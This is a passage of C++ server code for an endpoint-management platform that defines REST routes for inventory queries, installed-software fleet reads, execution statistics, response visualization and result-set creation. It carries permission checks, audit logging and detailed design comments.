                 data.add("collected_at", record->collected_at);
                 res.set_content(ok_json(data.str()), "application/json");
             });

    sink.Post("/api/v1/inventory/query", [perm_fn, inventory_store](const httplib::Request& req,
                                                                    httplib::Response& res) {
        if (!perm_fn(req, res, "Inventory", "Read"))
            return;
        if (!inventory_store || !inventory_store->is_open()) {
            res.status = 503;
            res.set_content(error_json("inventory store not available"), "application/json");
            return;
        }

        auto body = nlohmann::json::parse(req.body, nullptr, false);
        if (body.is_discarded()) {
            res.status = 400;
            res.set_content(error_json("invalid JSON"), "application/json");
            return;
        }

        InventoryQuery q;
        q.agent_id = body.value("agent_id", "");
        q.plugin = body.value("plugin", "");
        q.since = body.value("since", int64_t{0});
        q.until = body.value("until", int64_t{0});
        q.limit = body.value("limit", 100);
        if (q.limit > 1000)
            q.limit = 1000;

        auto records = inventory_store->query(q);
        JArr arr;
        for (const auto& r : records) {
            auto parsed = nlohmann::json::parse(r.data_json, nullptr, false);
            JObj item;
            item.add("agent_id", r.agent_id).add("plugin", r.plugin);
            if (!parsed.is_discarded()) {
                item.raw("data", r.data_json);
            } else {
                item.add("data", r.data_json);
            }
            item.add("collected_at", r.collected_at);
            arr.add(item);
        }
        res.set_content(list_json(arr.str(), static_cast<int64_t>(records.size())),
                        "application/json");
    });

    // GET /api/v1/inventory/software — typed daily-sync installed-software FLEET read
    // (ADR-0016). The REST sibling of the governed MCP query_installed_software tool;
    // mirrors it 1:1 (Inventory:Read → store → cap → management-group scope filter →
    // audit). DISTINCT from the generic /api/v1/inventory/* routes above, which read
    // the generic blob InventoryStore — this reads the typed SoftwareInventoryStore
    // (normalized rows). Single path segment, so it does not collide with the
    // two-segment /api/v1/inventory/{agent}/{plugin} regex.
    //
    // CONSISTENCY NOTE: the sibling generic routes share this securable (Inventory:Read)
    // but apply no per-agent filter at all. This endpoint carries the per-agent drop
    // filter as a FOUNDATION — but per ADR-0017 the filter is INERT under the global
    // Inventory:Read gate (a confined operator is denied at the gate before it runs; a
    // global operator's filter is a no-op), so this endpoint is NOT yet a working
    // scoped reference. The convergence target is the ADR-0017 admit-then-filter list
    // gate (#1716), not this endpoint as-is. Until then, list-view management-group
    // confinement under /inventory is not effective — a known, ticketed gap.
    // Agentic-first A1: a fleet software dashboard + a /device drill-down section
    // (planned follow-ons) sit on this same data + scope contract.
    //
    // Audit posture is deliberately SET-AND-PROCEED (plain audit_fn), NOT the
    // fail-closed emit_behavioral_audit the per-device DEX/device routes use:
    // installed-software is machine-scope, carries no end-user PII and no
    // works-council co-determination trigger (ADR-0016 §8), so it is NOT behavioural
    // PII — withholding data on an audit-persist miss is unwarranted. We still capture
    // the persist bool and surface audit_persisted:false, AND route every audit call
    // through the #1647 throw-safe kernel `detail::try_persist_audit` (a throwing audit
    // sink → false, not a 500 with no trail) — full parity with the MCP sibling's
    // mcp_audit (which wraps the same kernel), not just the bool-surfacing half.
    sink.Get("/api/v1/inventory/software",
             [auth_fn, perm_fn, audit_fn, software_inventory_store, inventory_scope_fn](
                 const httplib::Request& req, httplib::Response& res) {
                 const auto cid = detail::make_correlation_id();
                 res.set_header("X-Correlation-Id", cid); // echo on every path (A3)

                 // Resolve the principal first — the per-row scope predicate below needs
                 // the username (the flat Inventory:Read gate is not a per-device check).
                 auto session = auth_fn(req, res);
                 if (!session)
                     return; // auth_fn wrote 401
                 if (!perm_fn(req, res, "Inventory", "Read"))
                     return; // perm_fn wrote 401/403
                 // Null-store ONLY (not `!is_open()`): a constructed-but-closed store
                 // deliberately falls through to query_software(), which returns nullopt →
                 // the AUDITED degrade branch below (CC7.2 trail + MCP parity — MCP guards
                 // only `!store` too). A live server never serves a closed store anyway
                 // (server.cpp sets startup_failed_ and refuses to boot with one), so
                 // dropping the `!is_open()` short-circuit is defensive: it keeps the
                 // who/when/what trail intact against a future boot-gating refactor
                 // (gov arch-NICE-1 / compliance-CC7.2 / unhappy UP-7).
                 if (!software_inventory_store) {
                     res.status = 503;
                     res.set_content(
                         detail::error_json_a4(503, "software inventory store not available", cid),
                         "application/json");
                     return;
                 }

                 SoftwareFleetQuery q;
                 q.agent_id = req.has_param("agent_id") ? req.get_param_value("agent_id") : "";
                 q.name = req.has_param("name") ? req.get_param_value("name") : "";
                 // Clamp in 64-bit BEFORE narrowing (mirror the MCP tool / query_responses):
                 // limit<1 clamps to 1 and limit>1000 clamps to 1000; clamping in int64
                 // first stops a negative/wrapped value from binding unbounded and defeating
                 // the cap. No offset — the scope filter runs AFTER the store LIMIT, so paging
                 // would yield unstable windows over a sync-mutating table; keyset is the
                 // #1634 follow-up.
                 std::int64_t want = 100;
                 if (req.has_param("limit")) {
                     try {
                         want = std::stoll(req.get_param_value("limit"));
                     } catch (...) {
                         res.status = 400;
                         res.set_content(
                             detail::error_json_a4(400, "invalid limit (expected integer)", cid),
                             "application/json");
                         return;
                     }
                 }
                 q.limit = static_cast<int>(std::clamp<std::int64_t>(want, 1, 1000));

                 const std::string audit_key = !q.name.empty()      ? ("name=" + q.name)
                                               : !q.agent_id.empty() ? ("agent=" + q.agent_id)
                                                                     : std::string("fleet");

                 auto rows_opt = software_inventory_store->query_software(q);
                 if (!rows_opt) {
                     // Store degraded (pool/query failure) — surface it, NEVER an empty list.
                     // A silent empty reads as "installed nowhere" for a fleet vuln query
                     // (ADR-0016 §7 authoritative reads; agentic-first A4 failure-vs-empty).
                     // Audit the degraded access (CC7.2): a CVE-triage caller under a sustained
                     // outage must still leave a who/when/what trail. Routed through the #1647
                     // throw-safe kernel (NOT raw audit_fn) so a throwing audit sink can't eat
                     // the 503 — exact parity with the MCP sibling's mcp_audit (gov chaos CH-3).
                     (void)detail::try_persist_audit(audit_fn, req, "inventory.software.query",
                                                     "failure", "Inventory", audit_key,
                                                     "store degraded; cid=" + cid);
                     res.status = 503;
                     res.set_content(
                         detail::error_json_a4(503,
                                               "software inventory store degraded — query failed",
                                               cid, 5000, "retry the request"),
                         "application/json");
                     return;
                 }
                 auto& rows = *rows_opt;

                 // Cap hit BEFORE scope filtering → result incomplete (the store's hard ceiling
                 // >> 1000, so the binding cap is q.limit). Captured pre-filter: the filter
                 // shrinks `rows`. As with the MCP sibling, an empty-filter call is an unbounded
                 // fleet scan capped at q.limit on a global ORDER BY *before* the per-agent scope
                 // filter, so a narrow-scope operator may see few of their own rows in one page
                 // (signalled by result_truncated_by_cap). NOTE (ADR-0017): the per-agent filter
                 // here is INERT under the global Inventory:Read gate, so it does not actually
                 // narrow by management group today — do not read "ISOLATION holds" as effective
                 // list-view confinement (that is the ADR-0017 gate, #1716). Narrow-scope
                 // completeness over a wide fleet is the keyset follow-up (#1634).
                 const bool hit_cap = rows.size() == static_cast<std::size_t>(q.limit);

                 // Management-group scope filter (mirrors the MCP tool / query_responses #1550).
                 // The flat Inventory:Read gate is not a per-device ownership check, so without
                 // this an operator could read other operators' devices' software fleet-wide by
                 // name. Filter per-agent through the injected predicate, memoised per distinct
                 // agent_id. Unwired (RBAC-off / test) → no filter (legacy-open), matching the
                 // MCP default + require_scoped_permission.
                 bool scope_filtered = false;
                 std::size_t dropped_agents = 0;
                 if (inventory_scope_fn) {
                     std::unordered_map<std::string, bool> memo;
                     std::vector<SoftwareFleetRow> visible;
                     visible.reserve(rows.size());
                     for (auto& r : rows) {
                         auto [m, inserted] = memo.try_emplace(r.agent_id, false);
                         if (inserted)
                             m->second = inventory_scope_fn(session->username, r.agent_id);
                         if (m->second) {
                             visible.push_back(std::move(r));
                         } else {
                             scope_filtered = true;
                             if (inserted) // count each DISTINCT dropped device once
                                 ++dropped_agents;
                         }
                     }
                     rows.swap(visible);
                 }

                 JArr arr;
                 for (const auto& r : rows) {
                     arr.add(JObj()
                                 .add("agent_id", r.agent_id)
                                 .add("name", r.entry.name)
                                 .add("version", r.entry.version)
                                 .add("publisher", r.entry.publisher)
                                 .add("install_date", r.entry.install_date));
                 }

                 // Audit posture: SET-AND-PROCEED (see route header) — capture the persist
                 // bool, surface audit_persisted:false, never withhold. Routed through the
                 // #1647 throw-safe kernel `try_persist_audit` (NOT raw audit_fn) so a throwing
                 // audit sink returns false → audit_persisted:false instead of escaping the
                 // lambda as a 500 with no trail — exact throw-safety parity with the MCP
                 // sibling's mcp_audit (gov chaos CH-3). We use the kernel, NOT the fail-closed
                 // emit_behavioral_audit, because this machine-scope data is set-and-proceed.
                 // A scope-dropped read is security-relevant → audit it distinctly with the
                 // DISTINCT dropped count.
                 bool denied_ok = true;
                 if (scope_filtered)
                     denied_ok = detail::try_persist_audit(
                         audit_fn, req, "inventory.software.query", "denied", "Inventory", audit_key,
                         "scope: filtered " + std::to_string(dropped_agents) +
                             " out-of-management-group device(s); cid=" + cid);
                 const bool audit_ok =
                     detail::try_persist_audit(audit_fn, req, "inventory.software.query", "success",
                                               "Inventory", audit_key,
                                               "rows=" + std::to_string(arr.size()) + " cid=" + cid) &&
                     denied_ok;

                 JObj data;
                 data.raw("software", arr.str());
                 data.add("count", arr.size());
                 // Surface the count of devices dropped by the scope filter (0 when none) so an
                 // agentic caller can tell "out of my scope" from "not installed anywhere": a
                 // positive value means matching software exists outside the caller's scope
                 // (gov UP-12 false-negative guard). The audit row carries it too.
                 data.add("devices_omitted", static_cast<int64_t>(dropped_agents));
                 if (hit_cap)
                     data.add("result_truncated_by_cap", true);
                 if (!audit_ok)
                     data.add("audit_persisted", false);
                 res.set_content(ok_json(data.str()), "application/json");
             });

    // ── Execution Statistics (capability 1.9) ────────────────────────────

    sink.Get("/api/v1/execution-statistics",
             [perm_fn, execution_tracker](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "Execution", "Read"))
                     return;
                 auto summary = execution_tracker->get_fleet_summary();
                 auto data = JObj()
                                 .add("total_executions", summary.total_executions)
                                 .add("executions_today", summary.executions_today)
                                 .add("active_agents", summary.active_agents)
                                 .add("overall_success_rate", summary.overall_success_rate)
                                 .add("avg_duration_seconds", summary.avg_duration_seconds)
                                 .str();
                 res.set_content(ok_json(data), "application/json");
             });

    sink.Get("/api/v1/execution-statistics/agents",
             [perm_fn, execution_tracker](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "Execution", "Read"))
                     return;
                 ExecutionStatsQuery q;
                 if (req.has_param("agent_id"))
                     q.agent_id = req.get_param_value("agent_id");
                 if (req.has_param("since"))
                     try {
                         q.since = std::stoll(req.get_param_value("since"));
                     } catch (...) {}
                 if (req.has_param("limit"))
                     try {
                         q.limit = std::stoi(req.get_param_value("limit"));
                     } catch (...) {}
                 if (q.limit > 1000)
                     q.limit = 1000;
                 auto stats = execution_tracker->get_agent_statistics(q);
                 JArr arr;
                 for (const auto& s : stats) {
                     arr.add(JObj()
                                 .add("agent_id", s.agent_id)
                                 .add("total_executions", s.total_executions)
                                 .add("success_count", s.success_count)
                                 .add("failure_count", s.failure_count)
                                 .add("success_rate", s.success_rate)
                                 .add("avg_duration_seconds", s.avg_duration_seconds)
                                 .add("last_execution_at", s.last_execution_at));
                 }
                 res.set_content(list_json(arr.str(), static_cast<int64_t>(stats.size())),
                                 "application/json");
             });

    sink.Get("/api/v1/execution-statistics/definitions",
             [perm_fn, execution_tracker](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "Execution", "Read"))
                     return;
                 ExecutionStatsQuery q;
                 if (req.has_param("definition_id"))
                     q.definition_id = req.get_param_value("definition_id");
                 if (req.has_param("since"))
                     try {
                         q.since = std::stoll(req.get_param_value("since"));
                     } catch (...) {}
                 if (req.has_param("limit"))
                     try {
                         q.limit = std::stoi(req.get_param_value("limit"));
                     } catch (...) {}
                 if (q.limit > 1000)
                     q.limit = 1000;
                 auto stats = execution_tracker->get_definition_statistics(q);
                 JArr arr;
                 for (const auto& s : stats) {
                     arr.add(JObj()
                                 .add("definition_id", s.definition_id)
                                 .add("total_executions", s.total_executions)
                                 .add("total_agents", s.total_agents)
                                 .add("success_rate", s.success_rate)
                                 .add("avg_duration_seconds", s.avg_duration_seconds));
                 }
                 res.set_content(list_json(arr.str(), static_cast<int64_t>(stats.size())),
                                 "application/json");
             });

    // ── GET /api/v1/executions/{id} — final-state lookup (#1088 UAT-found gap)
    //
    // The W5.1 `GET /api/v1/events` 410 envelope's remediation hint
    // references this endpoint as the fallback for fetching final
    // execution state after the SSE channel has gone terminal. UAT
    // smoke on the #1088 PR caught that the endpoint did not exist
    // (only `/sse/executions/{id}` and `/fragments/executions/{id}/detail`).
    // This handler closes the W5.1 + #1088 contract: agentic workers
    // that miss the live SSE window can pull final state in one round-
    // trip without parsing HTML fragments.
    //
    // Auth: Execution:Read (same gate as /api/v1/events and the
    // dashboard SSE sibling). 404 on unknown id is A4-shaped. 503 on
    // unwired tracker carries `retry_after_ms` mirroring the
    // /api/v1/events startup-window behavior.
    sink.Get(
        R"(/api/v1/executions/([A-Za-z0-9_-]{1,128}))",
        [auth_fn, perm_fn, execution_tracker](const httplib::Request& req, httplib::Response& res) {
            auto session = auth_fn(req, res);
            if (!session)
                return;
            if (!perm_fn(req, res, "Execution", "Read"))
                return;
            const auto cid = detail::make_correlation_id();
            res.set_header("X-Correlation-Id", cid);
            if (!execution_tracker) {
                res.status = 503;
                res.set_content(
                    detail::error_json_a4(503, "execution tracker unavailable", cid,
                                          /*retry_after_ms=*/5000,
                                          "retry after server warmup; tracker initialises during "
                                          "startup or after a config reload"),
                    "application/json");
                return;
            }
            auto exec_id = req.matches[1].str();
            auto exec_opt = execution_tracker->get_execution(exec_id);
            if (!exec_opt) {
                res.status = 404;
                res.set_content(detail::error_json_a4(404, "execution not found", cid),
                                "application/json");
                return;
            }
            const auto& e = *exec_opt;
            // Mirrors the Execution struct field-for-field (per
            // execution_tracker.hpp). `last_error_detail` is PII-
            // adjacent (agent stderr) — the perm_fn(Execution:Read)
            // gate above is the same one mcp_server.cpp:get_execution_status
            // uses to protect this field; if those policies ever diverge,
            // sibling-handler parity needs revisiting.
            auto data = JObj()
                            .add("id", e.id)
                            .add("definition_id", e.definition_id)
                            .add("status", e.status)
                            .add("scope_expression", e.scope_expression)
                            .add("parameter_values", e.parameter_values)
                            .add("dispatched_by", e.dispatched_by)
                            .add("dispatched_at", static_cast<int64_t>(e.dispatched_at))
                            .add("agents_targeted", e.agents_targeted)
                            .add("agents_responded", e.agents_responded)
                            .add("agents_success", e.agents_success)
                            .add("agents_failure", e.agents_failure)
                            .add("completed_at", static_cast<int64_t>(e.completed_at))
                            .add("parent_id", e.parent_id)
                            .add("rerun_of", e.rerun_of)
                            .add("last_error_detail", e.last_error_detail)
                            .str();
            res.set_content(ok_json(data), "application/json");
        });

    // ── Response Visualization (issue #253, capability 20.6) ─────────────
    //
    // Renders an instruction's response set as chart-ready JSON using the
    // `spec.visualization` block stored on the InstructionDefinition. The
    // {id} path parameter is the response_store key (a.k.a. command_id /
    // instruction_id) returned at dispatch time. `definition_id` is required
    // because Yuzu's response model keys responses by command_id, not by
    // executions.id — the only durable link from a response set back to a
    // definition is the one the dispatcher recorded in the audit trail.
    //
    // Securable: Response:Read — sibling parity with /fragments/results,
    // /api/responses/{id}/aggregate, and /api/responses/{id}/export which
    // all read response_store on the same gate. Governance gate C-1.
    sink.Get(
        R"(/api/v1/executions/([A-Za-z0-9._-]+)/visualization)",
        [auth_fn, perm_fn, audit_fn, response_store, instruction_store, response_scope_fn](
            const httplib::Request& req, httplib::Response& res) {
            if (!perm_fn(req, res, "Response", "Read"))
                return;
            auto session = auth_fn(req, res);
            if (!session)
                return;
            if (!response_store || !instruction_store || !response_store->is_open() ||
                !instruction_store->is_open()) {
                res.status = 503;
                res.set_content(error_json("service unavailable", 503), "application/json");
                return;
            }

            auto execution_id = req.matches[1].str();
            if (!req.has_param("definition_id")) {
                res.status = 400;
                res.set_content(error_json("definition_id query parameter is required"),
                                "application/json");
                audit_fn(req, "execution.visualization.fetch", "failure", "execution", execution_id,
                         "reason=missing_definition_id");
                return;
            }
            auto definition_id = req.get_param_value("definition_id");

            // Closes governance sec-F3 / C-15: regex-bound definition_id
            // on the REST endpoint to match the dashboard fragment.
            // Without this, an unbounded value flows through audit_fn,
            // spdlog, and SQL bind parameters.
            static const std::regex kIdRegex{"^[A-Za-z0-9._-]{1,128}$"};
            if (!std::regex_match(definition_id, kIdRegex)) {
                res.status = 400;
                res.set_content(error_json("definition_id must match [A-Za-z0-9._-]{1,128}"),
                                "application/json");
                audit_fn(req, "execution.visualization.fetch", "failure", "execution", execution_id,
                         "reason=malformed_definition_id");
                return;
            }

            // Issue #587: optional `?index=N` selects which chart to
            // render when a definition declares multiple. Default 0.
            int chart_index = 0;
            if (req.has_param("index")) {
                try {
                    chart_index = std::stoi(req.get_param_value("index"));
                } catch (...) {
                    res.status = 400;
                    res.set_content(error_json("index must be a non-negative integer"),
                                    "application/json");
                    return;
                }
                if (chart_index < 0) {
                    res.status = 400;
                    res.set_content(error_json("index must be a non-negative integer"),
                                    "application/json");
                    return;
                }
            }

            auto def = instruction_store->get_definition(definition_id);
            if (!def) {
                res.status = 404;
                res.set_content(error_json("instruction definition not found"), "application/json");
                audit_fn(req, "execution.visualization.fetch", "failure", "execution", execution_id,
                         definition_id + " reason=definition_not_found");
                return;
            }
            int chart_count = VisualizationEngine::count(def->visualization_spec);
            if (chart_count == 0) {
                res.status = 404;
                res.set_content(error_json("no visualization configured for this definition"),
                                "application/json");
                audit_fn(req, "execution.visualization.fetch", "failure", "execution", execution_id,
                         definition_id + " reason=no_visualization");
                return;
            }
            if (chart_index >= chart_count) {
                res.status = 404;
                res.set_content(error_json("visualization index out of range (have " +
                                           std::to_string(chart_count) + " chart(s))"),
                                "application/json");
                audit_fn(req, "execution.visualization.fetch", "failure", "execution", execution_id,
                         definition_id + " reason=index_oor index=" + std::to_string(chart_index));
                return;
            }

            ResponseQuery q;
            // Sibling parity: dashboard_routes.cpp's /fragments/results
            // and the response aggregate/export paths use 10000. Closes
            // governance C-2 row-cap drift.
            static constexpr int kRowCap = 10000;
            q.limit = kRowCap;
            auto responses = response_store->query(execution_id, q);
            // rows_capped is computed on the RAW (pre-scope-filter) result, so it
            // still signals "more rows existed past the 10000 cap" independent of
            // the scope drop below (#1634 keyset follow-up). NOTE (#1634): the scope
            // filter below is INERT under the current global Response:Read gate (a
            // global holder admits every agent → nothing dropped); effective scoping
            // needs the admit-then-filter gate (remaining #1634 work). Its only active
            // effect today is failing closed on a corrupt rbac.db.
            bool rows_capped = static_cast<int>(responses.size()) >= kRowCap;
            if (rows_capped) {
                spdlog::warn("visualization row cap hit ({} rows): execution={} definition={}",
                             kRowCap, execution_id, definition_id);
            }

            // #1634: management-group scope — drop out-of-scope agents' rows BEFORE
            // the chart transform, mirroring MCP query_responses. The flat
            // Response:Read gate is not a per-agent ownership check, so without this
            // an operator could chart ANOTHER operator's execution by id. Filter
            // per-agent through the injected predicate (production:
            // check_scoped_permission, the same chokepoint the per-device routes
            // use), memoised per distinct agent_id, passing the already-resolved
            // principal. Unwired / RBAC-off → no filter (legacy-open), matching
            // require_scoped_permission.
            std::size_t scope_dropped = 0;
            if (response_scope_fn) {
                std::unordered_map<std::string, bool> memo;
                std::vector<StoredResponse> visible;
                visible.reserve(responses.size());
                for (auto& r : responses) {
                    auto [m, inserted] = memo.try_emplace(r.agent_id, false);
                    if (inserted)
                        m->second = response_scope_fn(session->username, r.agent_id);
                    if (m->second)
                        visible.push_back(std::move(r));
                    else if (inserted) // count each DISTINCT dropped agent once
                        ++scope_dropped;
                }
                responses.swap(visible);
            }

            VisualizationEngine engine;
            auto result =
                engine.transform_at(def->visualization_spec, chart_index, def->plugin, responses);
            if (!result.ok) {
                res.status = 500;
                auto parsed = nlohmann::json::parse(result.json, nullptr, false);
                auto msg = parsed.is_discarded() ? std::string("invalid spec")
                                                 : parsed.value("error", "invalid spec");
                res.set_content(error_json(msg), "application/json");
                audit_fn(req, "execution.visualization.fetch", "failure", "execution", execution_id,
                         definition_id + " err=" + msg);
                return;
            }
            // Stamp truncation status + chart index/total onto the
            // payload so the dashboard can show a "1/2" indicator and
            // a "showing first 10000 rows" banner. Closes UP-3 / ER-P1.
            std::string final_json = result.json;
            if (!final_json.empty() && final_json.back() == '}') {
                final_json.pop_back();
                final_json += ",\"chart_index\":" + std::to_string(chart_index);
                final_json += ",\"chart_count\":" + std::to_string(chart_count);
                if (rows_capped) {
                    final_json += ",\"rows_capped\":true,\"rows_cap\":";
                    final_json += std::to_string(kRowCap);
                }
                final_json += "}";
            }
            res.set_content(ok_json(final_json), "application/json");
            // Record the out-of-scope drop count on the success audit detail (#1634)
            // so an operator charting outside their groups leaves a trail, without
            // changing the single-row audit shape this endpoint already emits.
            std::string audit_detail = definition_id + " index=" + std::to_string(chart_index);
            if (scope_dropped > 0)
                audit_detail += " scope_dropped=" + std::to_string(scope_dropped);
            audit_fn(req, "execution.visualization.fetch", "success", "execution", execution_id,
                     audit_detail);
        });

    // ── Inventory Evaluation (capability 15.4) ────────────────────────────

    if (inventory_store) {
        sink.Post("/api/v1/inventory/evaluate",
                  [perm_fn, inventory_store](const httplib::Request& req, httplib::Response& res) {
                      if (!perm_fn(req, res, "Inventory", "Read"))
                          return;
                      auto body = nlohmann::json::parse(req.body, nullptr, false);
                      if (body.is_discarded()) {
                          res.status = 400;
                          res.set_content(error_json("invalid JSON"), "application/json");
                          return;
                      }

                      InventoryEvalRequest eval_req;
                      if (body.contains("agent_id"))
                          eval_req.agent_id = body["agent_id"].get<std::string>();
                      if (body.contains("combine"))
                          eval_req.combine = body["combine"].get<std::string>();
                      if (body.contains("conditions") && body["conditions"].is_array()) {
                          for (const auto& c : body["conditions"]) {
                              InventoryCondition cond;
                              if (c.contains("plugin"))
                                  cond.plugin = c["plugin"].get<std::string>();
                              if (c.contains("field"))
                                  cond.field = c["field"].get<std::string>();
                              if (c.contains("op"))
                                  cond.op = c["op"].get<std::string>();
                              if (c.contains("value"))
                                  cond.value = c["value"].get<std::string>();
                              eval_req.conditions.push_back(std::move(cond));
                          }
                      }

                      // Fetch inventory records
                      InventoryQuery iq;
                      if (!eval_req.agent_id.empty())
                          iq.agent_id = eval_req.agent_id;
                      iq.limit = 5000;
                      auto records_raw = inventory_store->query(iq);
                      std::vector<std::pair<std::string, std::string>> records;
                      for (const auto& r : records_raw) {
                          records.emplace_back(r.agent_id + "|" + r.plugin, r.data_json);
                      }

                      auto results = evaluate_inventory(eval_req, records);
                      JArr arr;
                      for (const auto& r : results) {
                          arr.add(JObj()
                                      .add("agent_id", r.agent_id)
                                      .add("match", r.match)
                                      .add("matched_value", r.matched_value)
                                      .add("plugin", r.plugin)
                                      .add("collected_at", r.collected_at));
                      }
                      res.set_content(list_json(arr.str(), static_cast<int64_t>(results.size())),
                                      "application/json");
                  });
    }

    // ── Result Sets / Scope Walking (capability 30.1/30.2) ────────────────
    // Per-operator, owner-scoped result sets. Authz is the owner check
    // (design §4.1 — phase 1 is owner-only; no RBAC securable type yet, a
    // ResultSet securable is a follow-up once cross-operator sharing lands).
    // Errors use the A4 envelope + the result-set error taxonomy. The two
    // async producers (from-tar-query / from-instruction-result) and re-eval
    // dispatch a command (create-execution-before-dispatch, UP2-4) and land a
    // `pending` row that the server maintenance thread materialises once the
    // producing execution reaches a terminal state (PR-D). They require the
    // command-dispatch callback + ExecutionTracker; without them they 503.
    if (result_set_store) {
        // Serialise a ResultSet row to a JSON object string.
        auto rs_to_json = [](const ResultSet& r) {
            JObj o;
            o.add("id", r.id);
            o.add("name", r.name);
            o.add("owner_principal", r.owner_principal);
            o.add("created_at", r.created_at);
            o.add("ttl_at", r.ttl_at);
            o.add("last_used_at", r.last_used_at);
            o.add("pinned", r.pinned);
            o.add("parent_id", r.parent_id.value_or(""));
            o.add("source_kind", r.source_kind);
            o.add("status", to_string(r.status));
            o.add("source_execution_id", r.source_execution_id);
            o.add("device_count", r.device_count);
            return o.str();
        };

        // Emit an A4 error with a fresh correlation id.
        auto rs_err = [](httplib::Response& res, int status, std::string_view msg) {
            auto cid = detail::make_correlation_id();
            res.status = status;
            res.set_content(detail::error_json_a4(status, msg, cid), "application/json");
        };

        // Load a row and enforce the owner check. Returns nullopt and writes a
        // 404 (existence-oracle-safe: non-owner is indistinguishable from
        // missing) when the row is absent or not owned by the session.
        auto load_owned = [result_set_store, rs_err, audit_fn](
                              const httplib::Request& req, const std::string& id,
                              const std::string& owner,
                              httplib::Response& res) -> std::optional<ResultSet> {
            auto row = result_set_store->get(id);
            if (!row || row->owner_principal != owner) {
                // Audit the failed access so probing the existence oracle leaves
                // a trail (review finding G). The 404 stays oracle-safe (a
                // non-owner is indistinguishable from missing); the audit row is
                // server-side only.
                audit_fn(req, "result_set.access", "denied", "ResultSet", id,
                         "not found or not owned");
                rs_err(res, 404, "RESULT_SET_NOT_FOUND: result set not found");
                return std::nullopt;
            }
            return row;
        };

        // Resolve a parent reference (canonical `rs_` id OR a per-operator
        // alias — design §2 "Source query" / §4.1) to a canonical owned id.
        // Alias pre-resolution at the dispatch layer is the right place: the
        // owner is known here, whereas `evaluate_scope` (which resolves
        // `from_result_set:` deep in the dispatch lambda) has no principal to
        // scope the alias lookup. Writes a 404 and returns nullopt when the
        // ref doesn't resolve to a row this session owns.
        auto resolve_owned_parent =
            [result_set_store, load_owned](const httplib::Request& req, const std::string& raw,
                                           const std::string& owner,
                                           httplib::Response& res) -> std::optional<std::string> {
            std::string id = raw;
            if (!raw.starts_with("rs_")) {
                if (auto canon = result_set_store->resolve_alias(owner, raw))
                    id = *canon;
                // else: id stays = raw; load_owned() below 404s on the miss.
            }
            auto row = load_owned(req, id, owner, res);
            if (!row)
                return std::nullopt;
            return id;
        };

        // Shared async-producer engine for `from-tar-query` /
        // `from-instruction-result` / `re-eval`. Implements the
        // create-execution-BEFORE-dispatch ordering (UP2-4) then lands a
        // `pending` row the maintenance thread materialises once the
        // execution reaches a terminal state (design §3.1). `body` is read
        // only for `parent_id`; everything else is passed explicitly so
        // re-eval can synthesise a body. Writes the 202 (or an error) on res.
        auto run_async = [result_set_store, execution_tracker, command_dispatch_fn, audit_fn,
                          metrics_registry, rs_to_json, rs_err, resolve_owned_parent](
                             const httplib::Request& req, httplib::Response& res,
                             const std::string& owner, const std::string& plugin,
                             const std::string& action,
                             const std::unordered_map<std::string, std::string>& params,
                             std::string_view src_kind, const std::string& source_payload,
                             const std::string& matcher, const nlohmann::json& body,
                             const std::string& name) {
            if (!command_dispatch_fn || !execution_tracker) {
                rs_err(res, 503, "RESULT_SET_DISPATCH_UNAVAILABLE: command dispatch not wired");
                return;
            }
            // Resolve the parent scope. parent_id present → dispatch is scoped
            // to that set's CURRENT members via the `from_result_set:` scope
            // kind; absent → broadcast to all connected agents (__all__).
            std::optional<std::string> parent_id;
            std::string scope_expr;
            if (body.contains("parent_id") && body["parent_id"].is_string() &&
                !body["parent_id"].get<std::string>().empty()) {
                auto canon =
                    resolve_owned_parent(req, body["parent_id"].get<std::string>(), owner, res);
                if (!canon)
                    return; // resolve_owned_parent wrote 404
                parent_id = *canon;
                scope_expr = "from_result_set:" + *canon;
            }

            // Create-before-dispatch: the execution_id must be registered
            // command_id→execution_id before any RPC so a FAST loopback agent
            // can't reply ahead of the mapping (UP2-4).
            Execution exec;
            exec.definition_id = std::string(src_kind);
            exec.status = "running";
            exec.scope_expression = scope_expr;
            exec.parameter_values = nlohmann::json(params).dump();
            exec.dispatched_by = owner;
            std::string exec_id;
            if (auto created = execution_tracker->create_execution(exec); created.has_value())
                exec_id = *created;
            if (exec_id.empty()) {
                rs_err(res, 500, "RESULT_SET_INTERNAL: failed to create execution row");
                return;
            }

            // Pre-dispatch quota check: never send a (possibly destructive)
            // command we can't record. create_pending re-checks atomically
            // below, but rejecting here means the common at-quota case fails
            // BEFORE any agent executes (review finding B5).
            if (result_set_store->count_for_owner(owner) >= ResultSetStore::kMaxPerOwner) {
                if (metrics_registry)
                    metrics_registry->counter("yuzu_result_set_quota_rejected").increment();
                execution_tracker->mark_cancelled(exec_id, owner);
                rs_err(res, 429, std::string(to_string(ResultSetError::QuotaExceeded)) +
                                     " execution_id=" + exec_id);
                return;
            }

            std::string command_id;
            int sent = 0;
            try {
                std::tie(command_id, sent) =
                    command_dispatch_fn(plugin, action, {}, scope_expr, params, exec_id);
            } catch (const std::exception& e) {
                spdlog::error("result-set async producer dispatch failed: {}", e.what());
                execution_tracker->mark_cancelled(exec_id, owner);
                rs_err(res, 500, "RESULT_SET_DISPATCH_FAILED: dispatch raised");
                return;
            }
            if (sent == 0) {
                // No agents in scope — record the attempt (forensic) and tell
                // the operator rather than leaking a pending row that idles to
                // the 300s timeout and then materialises empty.
                execution_tracker->mark_cancelled(exec_id, owner);
                rs_err(res, 503, "RESULT_SET_NO_AGENTS: no agents reached in the target scope");
                return;
            }
            execution_tracker->set_agents_targeted(exec_id, sent);

            CreateRequest cr;
            cr.owner_principal = owner;
            cr.name = name;
            cr.parent_id = parent_id;
            cr.source_kind = std::string(src_kind);
            cr.source_payload = source_payload;
            cr.matcher = matcher;
            auto created = result_set_store->create_pending(cr, exec_id);
            if (!created) {
                if (metrics_registry && created.error() == ResultSetError::QuotaExceeded)
                    metrics_registry->counter("yuzu_result_set_quota_rejected").increment();
                // The command already dispatched but there is no row to
                // materialise into — cancel the execution so it doesn't idle in
                // 'running', and surface exec_id so the operator can trace what
                // was sent (review B5; mirrors the throw / no-agents paths).
                execution_tracker->mark_cancelled(exec_id, owner);
                int status = created.error() == ResultSetError::QuotaExceeded ? 429 : 400;
                rs_err(res, status,
                       std::string(to_string(created.error())) + " execution_id=" + exec_id);
                return;
            }
            if (metrics_registry)
                metrics_registry
                    ->counter("yuzu_result_sets_total",
                              {{"source_kind", std::string(src_kind)}, {"result", "pending"}})
                    .increment();
